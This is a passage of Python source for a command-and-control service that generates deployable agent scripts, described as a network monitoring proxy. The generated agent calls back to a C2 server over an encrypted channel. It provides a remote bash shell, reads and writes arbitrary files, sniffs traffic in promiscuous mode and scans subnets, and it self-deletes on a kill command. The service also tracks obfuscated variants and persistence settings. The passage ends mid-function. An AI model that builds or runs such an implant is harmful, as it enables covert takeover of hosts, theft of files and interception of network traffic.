"""
Agent service for C2 management
"""

import secrets
import base64
import json
import logging
from typing import List, Optional, Dict, Any
from uuid import UUID
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select
from datetime import datetime

from app.models.agent import Agent, AgentType, AgentStatus
from app.schemas.agent import AgentCreate, AgentUpdate

logger = logging.getLogger(__name__)


class AgentService:
    """Service for managing agents"""
    
    @staticmethod
    def generate_auth_token() -> str:
        """Generate a secure authentication token"""
        return secrets.token_urlsafe(32)
    
    @staticmethod
    def generate_encryption_key() -> str:
        """Generate a secure encryption key for agent-C2 tunnel"""
        return secrets.token_urlsafe(32)
    
    @staticmethod
    def generate_download_token() -> str:
        """Generate a one-time download token"""
        return secrets.token_urlsafe(32)
    
    @staticmethod
    async def create_agent(db: AsyncSession, agent_data: AgentCreate) -> Agent:
        """Create a new agent template"""
        auth_token = AgentService.generate_auth_token()
        encryption_key = AgentService.generate_encryption_key()
        download_token = AgentService.generate_download_token()
        
        agent = Agent(
            name=agent_data.name,
            description=agent_data.description,
            agent_type=agent_data.agent_type,
            connection_url=agent_data.connection_url,
            auth_token=auth_token,
            encryption_key=encryption_key,
            download_token=download_token,
            capabilities=agent_data.capabilities,
            obfuscate=agent_data.obfuscate,
            startup_mode=agent_data.startup_mode,
            persistence_level=agent_data.persistence_level,
            agent_metadata=agent_data.agent_metadata or {},
            status=AgentStatus.DISCONNECTED,
            is_template=True  # New agents are templates by default
        )
        
        db.add(agent)
        await db.commit()
        await db.refresh(agent)
        
        return agent
    
    @staticmethod
    async def create_deployed_agent(db: AsyncSession, template: Agent) -> Agent:
        """Create a deployed agent instance from a template
        
        This is called when an agent connects and the target is a template.
        Creates a new agent record linked to the template with unique tokens.
        """
        import hashlib
        from datetime import datetime
        
        # Generate new tokens for this deployment
        auth_token = AgentService.generate_auth_token()
        encryption_key = AgentService.generate_encryption_key()
        download_token = AgentService.generate_download_token()
        
        # Generate strain_id based on template + timestamp for obfuscation tracking
        strain_data = f"{template.id}:{datetime.utcnow().isoformat()}:{secrets.token_hex(8)}"
        strain_id = hashlib.sha256(strain_data.encode()).hexdigest()[:16]
        
        # Create deployed agent with template's config
        deployed_agent = Agent(
            name=f"{template.name}_deployed",  # Will be updated with hostname on register
            description=f"Deployed from template: {template.name}",
            agent_type=template.agent_type,
            connection_url=template.connection_url,
            auth_token=auth_token,  # Keep template's auth for backward compatibility
            encryption_key=encryption_key,
            download_token=download_token,  # New download token
            capabilities=template.capabilities.copy() if template.capabilities else {},
            obfuscate=template.obfuscate,
            startup_mode=template.startup_mode,
            persistence_level=template.persistence_level,
            agent_metadata=template.agent_metadata.copy() if template.agent_metadata else {},
            status=AgentStatus.ONLINE,
            is_template=False,  # This is a deployed instance
            template_id=template.id,  # Link back to template
            strain_id=strain_id  # Track obfuscation variant
        )
        
        db.add(deployed_agent)
        await db.commit()
        await db.refresh(deployed_agent)
        
        return deployed_agent
    
    @staticmethod
    async def get_agent(db: AsyncSession, agent_id: UUID) -> Optional[Agent]:
        """Get agent by ID"""
        result = await db.execute(select(Agent).where(Agent.id == agent_id))
        return result.scalar_one_or_none()
    
    @staticmethod
    async def get_agents(
        db: AsyncSession, 
        skip: int = 0, 
        limit: int = 100,
        templates_only: bool = False,
        deployed_only: bool = False,
        template_id: UUID = None
    ) -> List[Agent]:
        """Get agents with optional filtering
        
        Args:
            templates_only: Only return templates (is_template=True)
            deployed_only: Only return deployed agents (is_template=False)
            template_id: Filter by parent template ID
        """
        query = select(Agent)
        
        if templates_only:
            query = query.where(Agent.is_template == True)
        elif deployed_only:
            query = query.where(Agent.is_template == False)
        
        if template_id:
            query = query.where(Agent.template_id == template_id)
        
        query = query.offset(skip).limit(limit)
        result = await db.execute(query)
        return list(result.scalars().all())
    
    @staticmethod
    async def update_agent(db: AsyncSession, agent_id: UUID, agent_data: AgentUpdate) -> Optional[Agent]:
        """Update agent"""
        agent = await AgentService.get_agent(db, agent_id)
        if not agent:
            return None
        
        update_data = agent_data.model_dump(exclude_unset=True)
        for field, value in update_data.items():
            setattr(agent, field, value)
        
        await db.commit()
        await db.refresh(agent)
        
        # Send settings update to connected agent
        if 'settings' in update_data:
            from app.api.v1.endpoints.agents import connected_agents
            agent_id_str = str(agent_id)
            if agent_id_str in connected_agents:
                try:
                    websocket = connected_agents[agent_id_str]
                    await websocket.send_json({
                        "type": "settings_update",
                        "settings": agent.settings or {}
                    })
                except Exception as e:
                    logger.warning("Failed to send settings update to agent %s: %s", agent_id, e)
        
        return agent
    
    @staticmethod
    async def delete_agent(db: AsyncSession, agent_id: UUID) -> bool:
        """Delete agent"""
        agent = await AgentService.get_agent(db, agent_id)
        if not agent:
            return False
        
        await db.delete(agent)
        await db.commit()
        
        return True
    
    @staticmethod
    async def update_agent_status(
        db: AsyncSession, 
        agent_id: UUID, 
        status: AgentStatus,
        update_last_seen: bool = True
    ) -> Optional[Agent]:
        """Update agent status and last seen time"""
        agent = await AgentService.get_agent(db, agent_id)
        if not agent:
            return None
        
        agent.status = status
        if update_last_seen:
            agent.last_seen = datetime.utcnow()
        
        if status == AgentStatus.ONLINE and not agent.connected_at:
            agent.connected_at = datetime.utcnow()
        
        await db.commit()
        await db.refresh(agent)
        
        return agent
    
    @staticmethod
    def generate_python_agent(agent: Agent) -> str:
        """Generate Python agent script with all modules (Asset, Traffic, Host, Access)"""
        # Replace {agent_id} placeholder in connection URL  
        server_url = agent.connection_url.replace('{agent_id}', str(agent.id))
        
        # Convert capabilities dict to Python repr (True/False instead of true/false)
        capabilities_repr = repr(agent.capabilities)
        
        # Get config from agent_metadata or use defaults
        config = agent.agent_metadata or {}
        config_repr = repr(config)
        
        template = f'''#!/usr/bin/env python3
"""
NOP Agent - {agent.name}
Generated: {datetime.utcnow().isoformat()}
Type: Python Proxy Agent
Encryption: AES-256-GCM (Encrypted tunnel to C2)

This agent acts as a proxy, relaying all data from the remote network
back to the NOP C2 server. All modules run here but data is processed
on the main NOP instance.

Download URL: {{BASE_URL}}/api/v1/agents/download/{agent.download_token}

INSTALLATION:
  pip3 install websockets psutil scapy cryptography netifaces
  
  OR run this agent with sudo (for scapy):
  sudo python3 agent.py
"""

# Auto-install dependencies if missing
import sys
import subprocess
import importlib.util

def check_and_install_deps():
    """Check and install required dependencies"""
    deps = {{
        'websockets': 'websockets',
        'psutil': 'psutil', 
        'scapy': 'scapy',
        'cryptography': 'cryptography',
        'netifaces': 'netifaces'
    }}
    
    missing = []
    for module, package in deps.items():
        if importlib.util.find_spec(module) is None:
            missing.append(package)
    
    if missing:
        print(f"Missing dependencies: {{', '.join(missing)}}")
        print("Installing dependencies...")
        try:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--user'] + missing)
            print("Dependencies installed successfully. Please run the agent again.")
            sys.exit(0)
        except subprocess.CalledProcessError as e:
            print(f"Failed to install dependencies: {{e}}")
            print(f"Please install manually: pip3 install {{' '.join(missing)}}")
            sys.exit(1)

check_and_install_deps()

import asyncio
import websockets
import json
import platform
import socket
import psutil
import scapy.all as scapy
import threading
from datetime import datetime
from typing import Dict, List, Any
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64
import os

# Agent Configuration
AGENT_ID = "{agent.id}"
AGENT_NAME = "{agent.name}"
AUTH_TOKEN = "{agent.auth_token}"
ENCRYPTION_KEY = "{agent.encryption_key}"
SERVER_URL = "{server_url}"
CAPABILITIES = {capabilities_repr}
CONFIG = {config_repr}

class NOPAgent:
    """NOP Proxy Agent - Relays data from remote network to C2 server with encrypted tunnel"""
    
    def __init__(self):
        self.agent_id = AGENT_ID
        self.agent_name = AGENT_NAME
        self.auth_token = AUTH_TOKEN
        self.encryption_key = ENCRYPTION_KEY.encode()
        self.server_url = SERVER_URL
        self.capabilities = CAPABILITIES
        self.config = CONFIG
        self.ws = None
        self.running = True
        self.cipher = self._init_cipher()
        self.passive_hosts = []  # Track passively discovered hosts
        self.captured_flows = []  # Track captured network flows
        self.flow_lock = threading.Lock()  # Thread-safe flow access
        self.terminal_sessions = {{}}  # session_id -> (master_fd, pid)
        
        # Extract nested discovery settings to top-level config
        if 'settings' in self.config and 'discovery' in self.config['settings']:
            discovery = self.config['settings']['discovery']
            self.config['passive_discovery'] = discovery.get('passive_discovery', False)
            self.config['sniff_interface'] = discovery.get('interface_name', 'eth1')
            self.config['scan_subnet'] = discovery.get('network_range', '')
            self.config['auto_discovery'] = discovery.get('discovery_enabled', False)
            self.config['discovery_interval'] = discovery.get('discovery_interval', 300)
    
    def _init_cipher(self):
        """Initialize AES-GCM cipher for encrypted communication"""
        # Derive encryption key using PBKDF2HMAC
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=b'nop_c2_salt_2026',
            iterations=100000,
        )
        key = kdf.derive(self.encryption_key)
        return AESGCM(key)
    
    def encrypt_message(self, data: str) -> str:
        """Encrypt message for C2 transmission"""
        nonce = os.urandom(12)
        ciphertext = self.cipher.encrypt(nonce, data.encode(), None)
        encrypted = base64.b64encode(nonce + ciphertext).decode()
        return encrypted
    
    def decrypt_message(self, encrypted_data: str) -> str:
        """Decrypt message from C2"""
        data = base64.b64decode(encrypted_data)
        nonce = data[:12]
        ciphertext = data[12:]
        plaintext = self.cipher.decrypt(nonce, ciphertext, None)
        return plaintext.decode()
        
    async def send_encrypted(self, message: dict):
        """Send encrypted message to C2"""
        json_str = json.dumps(message)
        encrypted = self.encrypt_message(json_str)
        await self.ws.send(json.dumps({{
            "encrypted": True,
            "data": encrypted
        }}))
        
    async def connect(self):
        """Connect to NOP C2 server with encrypted tunnel"""
        try:
            print(f"[{{datetime.now()}}] Connecting to C2 server: {{self.server_url}}...")
            # Connect without extra_headers for compatibility with older websockets versions
            async with websockets.connect(self.server_url) as websocket:
                self.ws = websocket
                print(f"[{{datetime.now()}}] Connected! Establishing encrypted tunnel...")
                
                # Register with C2
                await self.register()
                
                # Start modules and message handler
                await asyncio.gather(
                    self.heartbeat(),
                    self.message_handler(),
                    self.asset_module() if self.capabilities.get("asset") else self.noop(),
                    self.traffic_module() if self.capabilities.get("traffic") else self.noop(),
                    self.host_module() if self.capabilities.get("host") else self.noop(),
                    self.access_module() if self.capabilities.get("access") else self.noop()
                )
        except Exception as e:
            print(f"[{{datetime.now()}}] Connection error: {{e}}")
            await asyncio.sleep(5)
            
    async def noop(self):
        """No-op for disabled modules"""
        pass
        
    async def register(self):
        """Register agent with C2 server"""
        registration = {{
            "type": "register",
            "agent_id": self.agent_id,
            "agent_name": self.agent_name,
            "capabilities": self.capabilities,
            "system_info": {{
                "hostname": socket.gethostname(),
                "platform": platform.system(),
                "version": platform.version(),
                "ip_address": socket.gethostbyname(socket.gethostname())
            }}
        }}
        await self.ws.send(json.dumps(registration))
        print(f"[{{datetime.now()}}] Registered with C2 server")
        
    async def heartbeat(self):
        """Send periodic heartbeat to C2"""
        while self.running:
            try:
                await asyncio.sleep(30)
                heartbeat = {{
                    "type": "heartbeat",
                    "agent_id": self.agent_id,
                    "timestamp": datetime.utcnow().isoformat()
                }}
                await self.ws.send(json.dumps(heartbeat))
            except Exception as e:
                print(f"[{{datetime.now()}}] Heartbeat error: {{e}}")
                break
                
    async def message_handler(self):
        """Handle incoming commands from C2"""
        async for message in self.ws:
            try:
                data = json.loads(message)
                msg_type = data.get("type")
                
                if msg_type == "terminate":
                    print(f"[{{datetime.now()}}] Terminate command received from C2")
                    print(f"[{{datetime.now()}}] Message: {{data.get('message', 'Shutting down...')}}")
                    self.running = False
                    break
                elif msg_type == "kill":
                    print(f"[{{datetime.now()}}] KILL command received - Self-destructing...")
                    print(f"[{{datetime.now()}}] Message: {{data.get('message', '')}}")
                    self.running = False
                    # Delete self
                    try:
                        import os
                        agent_file = os.path.abspath(__file__)
                        print(f"[{{datetime.now()}}] Deleting agent file: {{agent_file}}")
                        os.remove(agent_file)
                        print(f"[{{datetime.now()}}] Agent file deleted successfully")
                    except Exception as e:
                        print(f"[{{datetime.now()}}] Failed to delete agent file: {{e}}")
                    break
                elif msg_type == "command":
                    await self.handle_command(data)
                elif msg_type == "ping":
                    await self.send_pong()
                elif msg_type == "settings_update":
                    await self.handle_settings_update(data)
                # Terminal commands
                elif msg_type == "terminal_start":
                    await self.handle_terminal_start(data)
                elif msg_type == "terminal_input":
                    await self.handle_terminal_input(data)
                elif msg_type == "terminal_resize":
                    await self.handle_terminal_resize(data)
                elif msg_type == "terminal_stop":
                    await self.handle_terminal_stop(data)
                # Filesystem commands
                elif msg_type == "filesystem_browse":
                    await self.handle_filesystem_browse(data)
                elif msg_type == "filesystem_read":
                    await self.handle_filesystem_read(data)
                elif msg_type == "filesystem_write":
                    await self.handle_filesystem_write(data)
            except Exception as e:
                print(f"[{{datetime.now()}}] Message handling error: {{e}}")
    
    async def handle_terminal_start(self, data):
        """Start a PTY terminal session"""
        import pty
        import os
        import fcntl
        import termios
        import struct
        
        session_id = data.get("session_id")
        if not session_id:
            return
            
        try:
            # Create PTY
            master_fd, slave_fd = pty.openpty()
            
            # Fork a child process
            pid = os.fork()
            
            if pid == 0:
                # Child process
                os.close(master_fd)
                os.setsid()
                
                # Set up the slave as the controlling terminal
                os.dup2(slave_fd, 0)
                os.dup2(slave_fd, 1)
                os.dup2(slave_fd, 2)
                
                if slave_fd > 2:
                    os.close(slave_fd)
                
                # Execute shell
                os.execvp('/bin/bash', ['/bin/bash', '-l'])
            
            # Parent process
            os.close(slave_fd)
            
            # Set non-blocking mode
            flags = fcntl.fcntl(master_fd, fcntl.F_GETFL)
            fcntl.fcntl(master_fd, fcntl.F_SETFL, flags | os.O_NONBLOCK)
            
            # Store session
            self.terminal_sessions[session_id] = (master_fd, pid)
            
            # Start reading from PTY in background
            asyncio.create_task(self.read_terminal_output(session_id, master_fd))
            
            print(f"[{{datetime.now()}}] Terminal session started: {{session_id}}")
            
        except Exception as e:
            print(f"[{{datetime.now()}}] Terminal start error: {{e}}")
            await self.relay_to_c2({{
                "type": "terminal_output",
                "session_id": session_id,
                "data": f"\\r\\n\\x1b[31mError starting terminal: {{e}}\\x1b[0m\\r\\n"
            }})
    
    async def read_terminal_output(self, session_id, master_fd):
        """Read PTY output and send to C2"""
        import os
        
        while session_id in self.terminal_sessions:
            try:
                await asyncio.sleep(0.01)
                try:
                    data = os.read(master_fd, 4096)
                    if data:
                        await self.relay_to_c2({{
                            "type": "terminal_output",
                            "session_id": session_id,
                            "data": data.decode('utf-8', errors='replace')
                        }})
                except OSError:
                    pass
            except asyncio.CancelledError:
                break
            except Exception as e:
                break
    
    async def handle_terminal_input(self, data):
        """Handle terminal input from C2"""
        import os
        
        session_id = data.get("session_id")
        input_data = data.get("data", "")
        is_binary = data.get("is_binary", False)
        
        if session_id not in self.terminal_sessions:
            return
            
        master_fd, pid = self.terminal_sessions[session_id]
        
        try:
            if is_binary:
                import base64
                os.write(master_fd, base64.b64decode(input_data))
            else:
                os.write(master_fd, input_data.encode('utf-8'))
        except Exception as e:
            print(f"[{{datetime.now()}}] Terminal input error: {{e}}")
    
    async def handle_terminal_resize(self, data):
        """Handle terminal resize from C2"""
        import fcntl
        import termios
        import struct
        
        session_id = data.get("session_id")
        cols = data.get("cols", 80)
        rows = data.get("rows", 24)
        
        if session_id not in self.terminal_sessions:
            return
            
        master_fd, pid = self.terminal_sessions[session_id]
        
        try:
            winsize = struct.pack('HHHH', rows, cols, 0, 0)
            fcntl.ioctl(master_fd, termios.TIOCSWINSZ, winsize)
        except Exception as e:
            print(f"[{{datetime.now()}}] Terminal resize error: {{e}}")
    
    async def handle_terminal_stop(self, data):
        """Stop a terminal session"""
        import os
        
        session_id = data.get("session_id")
        
        if session_id not in self.terminal_sessions:
            return
            
        master_fd, pid = self.terminal_sessions[session_id]
        
        try:
            os.close(master_fd)
            os.kill(pid, 9)
            os.waitpid(pid, 0)
        except:
            pass
        
        del self.terminal_sessions[session_id]
        print(f"[{{datetime.now()}}] Terminal session stopped: {{session_id}}")
    
    async def handle_filesystem_browse(self, data):
        """Browse filesystem and send response to C2"""
        import os
        from pathlib import Path
        
        request_id = data.get("request_id")
        path = data.get("path", "/")
        
        try:
            target_path = Path(path).resolve()
            
            if not target_path.exists():
                await self.relay_to_c2({{
                    "type": "filesystem_response",
                    "request_id": request_id,
                    "data": {{
                        "current_path": path,
                        "parent_path": str(target_path.parent) if target_path.parent != target_path else None,
                        "items": [],
                        "error": "Path does not exist"
                    }}
                }})
                return
            
            if not target_path.is_dir():
                await self.relay_to_c2({{
                    "type": "filesystem_response",
                    "request_id": request_id,
                    "data": {{
                        "current_path": path,
                        "parent_path": str(target_path.parent),
                        "items": [],
                        "error": "Path is not a directory"
                    }}
                }})
                return
            
            items = []
            for item in target_path.iterdir():
                try:
                    stat = item.stat()
                    items.append({{
                        "name": item.name,
                        "path": str(item),
                        "type": "directory" if item.is_dir() else "file",
                        "size": stat.st_size if item.is_file() else 0,
                        "modified": datetime.fromtimestamp(stat.st_mtime).isoformat(),
                        "permissions": oct(stat.st_mode)[-3:],
                    }})
                except (PermissionError, OSError) as e:
                    items.append({{
                        "name": item.name,
                        "path": str(item),
                        "type": "unknown",
                        "error": str(e)
                    }})
            
            # Sort: directories first, then by name
            items.sort(key=lambda x: (x['type'] != 'directory', x['name'].lower()))
            
            await self.relay_to_c2({{
                "type": "filesystem_response",
                "request_id": request_id,
                "data": {{
                    "current_path": str(target_path),
                    "parent_path": str(target_path.parent) if target_path.parent != target_path else None,
                    "items": items
                }}
            }})
            
        except Exception as e:
            await self.relay_to_c2({{
                "type": "filesystem_response",
                "request_id": request_id,
                "data": {{
                    "current_path": path,
                    "parent_path": None,
                    "items": [],
                    "error": str(e)
                }}
            }})
    
    async def handle_filesystem_read(self, data):
        """Read file and send content to C2"""
        from pathlib import Path
        import base64
        
        request_id = data.get("request_id")
        path = data.get("path")
        
        try:
            target_path = Path(path).resolve()
            
            if not target_path.exists():
                await self.relay_to_c2({{
                    "type": "filesystem_read_response",
                    "request_id": request_id,
                    "error": "File does not exist"
                }})
                return
            
            # Limit file size to 1MB
            if target_path.stat().st_size > 1024 * 1024:
                await self.relay_to_c2({{
                    "type": "filesystem_read_response",
                    "request_id": request_id,
                    "error": "File too large (max 1MB)"
                }})
                return
            
            try:
                content = target_path.read_text()
                is_binary = False
            except UnicodeDecodeError:
                content = base64.b64encode(target_path.read_bytes()).decode('utf-8')
                is_binary = True
            
            await self.relay_to_c2({{
                "type": "filesystem_read_response",
                "request_id": request_id,
                "data": {{
                    "path": str(target_path),
                    "content": content,
                    "is_binary": is_binary,
                    "size": target_path.stat().st_size
                }}
            }})
            
        except Exception as e:
            await self.relay_to_c2({{
                "type": "filesystem_read_response",
                "request_id": request_id,
                "error": str(e)
            }})
    
    async def handle_filesystem_write(self, data):
        """Write content to file"""
        from pathlib import Path
        import base64
        
        request_id = data.get("request_id")
        path = data.get("path")
        content = data.get("content", "")
        is_binary = data.get("is_binary", False)
        
        try:
            target_path = Path(path).resolve()
            target_path.parent.mkdir(parents=True, exist_ok=True)
            
            if is_binary:
                target_path.write_bytes(base64.b64decode(content))
            else:
                target_path.write_text(content)
            
            await self.relay_to_c2({{
                "type": "filesystem_write_response",
                "request_id": request_id,
                "data": {{
                    "path": str(target_path),
                    "status": "success"
                }}
            }})
            
        except Exception as e:
            await self.relay_to_c2({{
                "type": "filesystem_write_response",
                "request_id": request_id,
                "error": str(e)
            }})
                
    async def handle_command(self, data):
        """Execute command from C2 based on module capabilities"""
        command = data.get("command")
        print(f"[{{datetime.now()}}] Received command: {{command}}")
        
        # Commands are handled by respective modules
        # This is just a placeholder for custom C2 commands
    
    async def handle_settings_update(self, data):
        """Handle settings update from C2"""
        try:
            settings = data.get("settings", {{}})
            print(f"[{{datetime.now()}}] Settings update received from C2")
            
            # Extract discovery settings
            discovery = settings.get("discovery", {{}})
            if discovery:
                # Update config with discovery settings
                self.config["passive_discovery"] = discovery.get("passive_discovery", False)
                self.config["sniff_interface"] = discovery.get("interface_name", "eth1")
                self.config["scan_subnet"] = discovery.get("network_range", "")
                self.config["auto_discovery"] = discovery.get("auto_discovery", False)
                self.config["discovery_interval"] = discovery.get("discovery_interval", 300)
                self.config["discovery_method"] = discovery.get("discovery_method", "arp")
                self.config["track_source_only"] = discovery.get("track_source_only", False)
                
                print(f"[{{datetime.now()}}] Discovery config updated:")
                print(f"  - Passive discovery: {{self.config.get('passive_discovery')}}")
                print(f"  - Auto discovery: {{self.config.get('auto_discovery')}}")
                print(f"  - Interface: {{self.config.get('sniff_interface')}}")
                print(f"  - Network: {{self.config.get('scan_subnet')}}")
                print(f"  - Interval: {{self.config.get('discovery_interval')}}s")
                print(f"  - Method: {{self.config.get('discovery_method')}}")
                
                # Restart passive discovery if enabled
                if self.config.get("passive_discovery"):
                    print(f"[{{datetime.now()}}] Starting passive discovery...")
                    asyncio.create_task(self.passive_discovery())
        except Exception as e:
            print(f"[{{datetime.now()}}] Settings update error: {{e}}")
        
    # ============================================================================
    # ASSET MODULE - Network asset discovery and monitoring
    # ============================================================================
    async def asset_module(self):
        """Asset Discovery Module - Discovers network hosts via ARP and passive sniffing"""
        print(f"[{{datetime.now()}}] Asset module started")
        
        # Start passive discovery if enabled
        passive_enabled = self.config.get('passive_discovery', False)
        if passive_enabled:
            asyncio.create_task(self.passive_discovery())
            print(f"[{{datetime.now()}}] Passive discovery enabled")
        
        while self.running:
            try:
                # Get auto-discovery settings
                auto_discovery = self.config.get('auto_discovery', False)
                discovery_interval = self.config.get('discovery_interval', 300)
                
                # Wait for configured interval
                await asyncio.sleep(discovery_interval)
                
                # Only run auto-discovery if enabled
                if not auto_discovery:
                    continue
                
                assets = await self.discover_assets()
                
                # Include passively discovered hosts
                if passive_enabled and self.passive_hosts:
                    print(f"[{{datetime.now()}}] Including {{len(self.passive_hosts)}} passively discovered hosts")
                    assets.extend(self.passive_hosts)
                    self.passive_hosts = []  # Clear after sending
                
                await self.relay_to_c2({{
                    "type": "asset_data",
                    "agent_id": self.agent_id,
                    "assets": assets,
                    "timestamp": datetime.utcnow().isoformat()
                }})
            except Exception as e:
                print(f"[{{datetime.now()}}] Asset module error: {{e}}")
    
    async def passive_discovery(self):
        """Passive network discovery via packet sniffing"""
        try:
            import netifaces
            
            # Get interface to sniff on
            sniff_iface = self.config.get('sniff_interface')
            if not sniff_iface:
                # Auto-select best non-loopback interface
                for iface in netifaces.interfaces():
                    if iface != 'lo' and iface.startswith('eth'):
                        sniff_iface = iface
                        break
            
            if not sniff_iface:
                print(f"[{{datetime.now()}}] No suitable interface for passive discovery")
                return
            
            print(f"[{{datetime.now()}}] Starting passive discovery on {{sniff_iface}}")
            
            def packet_handler(packet):
                """Process captured packets for host discovery AND flow capture"""
                try:
                    if packet.haslayer(scapy.IP):
                        src_ip = packet[scapy.IP].src
                        dst_ip = packet[scapy.IP].dst
                        
                        # Extract MAC if available
                        src_mac = None
                        dst_mac = None
                        if packet.haslayer(scapy.Ether):
                            src_mac = packet[scapy.Ether].src
                            dst_mac = packet[scapy.Ether].dst
                        
                        # === HOST DISCOVERY ===
                        existing_ips = [h.get('ip') for h in self.passive_hosts]
                        if src_ip not in existing_ips:
                            host_info = {{
                                "ip": src_ip,
                                "mac": src_mac,
                                "status": "online",
                                "discovered_at": datetime.utcnow().isoformat(),
                                "method": "passive"
                            }}
                            self.passive_hosts.append(host_info)
                            print(f"[{{datetime.now()}}] Passive: discovered {{src_ip}} ({{src_mac}})")
                        
                        # === FLOW CAPTURE ===
                        protocol = "other"
                        src_port = 0
                        dst_port = 0
                        
                        if packet.haslayer(scapy.TCP):
                            protocol = "tcp"
                            src_port = packet[scapy.TCP].sport
                            dst_port = packet[scapy.TCP].dport
                        elif packet.haslayer(scapy.UDP):
                            protocol = "udp"
                            src_port = packet[scapy.UDP].sport
                            dst_port = packet[scapy.UDP].dport
                        elif packet.haslayer(scapy.ICMP):
                            protocol = "icmp"
                        
                        # Create flow record
                        flow = {{
                            "src_ip": src_ip,
                            "dst_ip": dst_ip,
                            "src_port": src_port,
                            "dst_port": dst_port,
                            "protocol": protocol,
                            "bytes": len(packet),
                            "timestamp": datetime.utcnow().isoformat()
                        }}
                        
                        with self.flow_lock:
                            self.captured_flows.append(flow)
                            # Keep only last 1000 flows in memory
                            if len(self.captured_flows) > 1000:
                                self.captured_flows = self.captured_flows[-500:]
                                
                except Exception as e:
                    pass  # Silently ignore packet processing errors
            
            # Sniff packets in separate thread (blocking call) with root privileges
            def start_sniffer():
                try:
                    # Use promisc mode for better packet capture
                    # Note: Requires NET_ADMIN capability or root
                    scapy.sniff(
                        iface=sniff_iface, 
                        prn=packet_handler, 
                        store=0, 
                        promisc=True,
                        filter="ip"  # Only capture IP packets to reduce noise
                    )
                except PermissionError:
                    print(f"[{{datetime.now()}}] Warning: Insufficient permissions for promiscuous mode")
                    print(f"[{{datetime.now()}}] Attempting normal mode (may miss some packets)...")
                    try:
                        scapy.sniff(iface=sniff_iface, prn=packet_handler, store=0)
                    except Exception as e:
                        print(f"[{{datetime.now()}}] Sniffer failed: {{e}}")
                except Exception as e:
                    print(f"[{{datetime.now()}}] Sniffer thread error: {{e}}")
            
            sniffer_thread = threading.Thread(target=start_sniffer, daemon=True)
            sniffer_thread.start()
            print(f"[{{datetime.now()}}] Passive discovery thread started (promisc mode, filter=ip)")
            
        except Exception as e:
            print(f"[{{datetime.now()}}] Passive discovery error: {{e}}")
                
    async def discover_assets(self) -> List[Dict]:
        """Discover network assets via ARP scan"""
        try:
            # Check if custom scan subnet is configured
            scan_subnet = self.config.get('scan_subnet')
            
            if not scan_subnet:
                # Auto-detect network from interfaces
                # Get all interfaces and find the best one for scanning
                # Prefer interfaces that are NOT on common docker/internal networks
                import netifaces
                from ipaddress import IPv4Network, IPv4Interface
                
                best_interface = None
                best_ip = None
                best_netmask = None
                
                for iface in netifaces.interfaces():
                    if iface == 'lo':
                        continue
                    addrs = netifaces.ifaddresses(iface)
                    if netifaces.AF_INET in addrs:
                        for addr in addrs[netifaces.AF_INET]:
                            ip = addr.get('addr', '')
                            netmask = addr.get('netmask', '255.255.255.0')
                            if ip and not ip.startswith('127.'):
                                # Prefer non-172.28.x.x networks (docker internal)
                                if not ip.startswith('172.28.'):
                                    best_interface = iface
                                    best_ip = ip
                                    best_netmask = netmask
                                    break
                                elif best_ip is None:
                                    best_interface = iface
                                    best_ip = ip
                                    best_netmask = netmask
                
                if not best_ip:
                    # Fallback to original method
                    best_ip = socket.gethostbyname(socket.gethostname())
                    best_netmask = '255.255.255.0'
                
                # Calculate network using actual netmask from interface
                try:
                    iface_obj = IPv4Interface(f"{{best_ip}}/{{best_netmask}}")
                    network = str(iface_obj.network)
                except:
                    network = '.'.join(best_ip.split('.')[:3]) + '.0/24'
            else:
                # Use configured subnet - support multiple subnets via comma separation
                network = scan_subnet
                best_interface = 'custom'
                
                # If multiple subnets configured (comma-separated), scan each
                if ',' in scan_subnet:
                    networks_to_scan = [n.strip() for n in scan_subnet.split(',')]
                    discovered = []
                    for net in networks_to_scan:
                        discovered.extend(await self._scan_network(net, best_interface))
                    return discovered
            
            print(f"[{{datetime.now()}}] Scanning network: {{network}} (interface: {{best_interface or 'default'}})")
            
            # For large networks (/16, /8), scan targeted subnets instead of entire network
            from ipaddress import IPv4Network
            try:
                net_obj = IPv4Network(network)
                # If network is larger than /24, limit scope or scan in chunks
                if net_obj.prefixlen < 24:
                    # For networks like 10.10.0.0/16, scan multiple /24 subnets
                    print(f"[{{datetime.now()}}] Large network detected, scanning targeted /24 subnets...")
                    # Scan first 10 /24 subnets (e.g., 10.10.0.0/24, 10.10.1.0/24, etc.)
                    base_octets = str(net_obj.network_address).split('.')
                    scan_subnets = []
                    for third_octet in range(0, min(10, 256)):  # Limit to first 10 subnets
                        subnet = f"{{base_octets[0]}}.{{base_octets[1]}}.{{third_octet}}.0/24"
                        scan_subnets.append(subnet)
                else:
                    scan_subnets = [network]
            except:
                scan_subnets = [network]
            
            # Get timeout from config (default 1 second for better responsiveness)
            scan_timeout = self.config.get('scan_timeout', 1)
            
            assets = []
            for subnet in scan_subnets:
                try:
                    # ARP scan this subnet
                    arp_request = scapy.ARP(pdst=subnet)
                    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
                    arp_request_broadcast = broadcast/arp_request
                    answered_list = scapy.srp(arp_request_broadcast, timeout=scan_timeout, verbose=False)[0]
                    
                    for element in answered_list:
                        asset = {{
                            "ip": element[1].psrc,
                            "mac": element[1].hwsrc,
                            "status": "online",
                            "discovered_at": datetime.utcnow().isoformat()
                        }}
                        assets.append(asset)
                except Exception as e:
                    print(f"[{{datetime.now()}}] Scan error for {{subnet}}: {{e}}")
                    
            print(f"[{{datetime.now()}}] Discovered {{len(assets)}} assets via ARP")
            return assets
        except Exception as e:
            print(f"[{{datetime.now()}}] Asset discovery error: {{e}}")
            return []
    
    # ============================================================================
    # TRAFFIC MODULE - Network traffic monitoring and analysis
    # ============================================================================
    async def traffic_module(self):
        """Traffic Monitoring Module - Captures and analyzes network traffic"""
        print(f"[{{datetime.now()}}] Traffic module started")
        while self.running:
            try:
                await asyncio.sleep(30)  # Send flows every 30 seconds
                traffic_stats = await self.capture_traffic_stats()
                
                # Get captured flows
                with self.flow_lock:
                    flows_to_send = self.captured_flows.copy()
                    self.captured_flows = []  # Clear after getting
                
                # Aggregate flows by connection tuple
                aggregated = {{}}
                for flow in flows_to_send:
                    key = (flow['src_ip'], flow['dst_ip'], flow['protocol'], flow['dst_port'])
                    if key not in aggregated:
                        aggregated[key] = {{
                            "src_ip": flow['src_ip'],
                            "dst_ip": flow['dst_ip'],
